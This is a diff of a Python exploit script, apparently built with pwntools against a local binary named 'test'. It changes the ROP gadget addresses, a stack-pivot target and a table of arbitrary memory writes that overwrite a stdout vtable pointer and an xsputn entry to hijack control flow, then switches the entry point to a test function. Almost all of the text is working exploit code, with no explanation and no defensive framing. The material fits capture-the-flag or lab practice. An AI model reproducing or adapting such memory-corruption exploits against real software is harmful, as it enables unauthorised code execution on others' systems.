@@ -15,15 +15,14 @@ def main_test():
     pop_rdi_ret = 0x4005d5
     pop_rbp_ret = 0x400a30
 
-    stack_pivot = 0x6ccee0
+    stack_pivot = 0x6cb300
 
     writes = {
         base + xsputn_offset: 0x4b95d8,
-        stdout_vtable_addr + 1: 0x6cd0,
-        stack_pivot: pop_rbp_ret,
-        stack_pivot + 8: 0x6cc000,
-        stack_pivot + 16: pop_rdi_ret,
-        stack_pivot + 24: stack_pivot + 40
+        stdout_vtable_addr: 0x6cd0e0,
+        stack_pivot: pop_rdi_ret,
+        stack_pivot + 8: 0xb318,
+        stack_pivot + 26: 0x400aee
     }
 
     for i in writes.items():
@@ -33,7 +32,7 @@ def main_test():
     print("payload len {}".format(len(payload)))
 
     
-def main():
+def main_():
     p = process("./test")
     raw_input()
     writes = {
@@ -44,4 +43,4 @@ def main():
     p.interactive()
 
 if __name__ == "__main__":
-    main()
+    main_test()
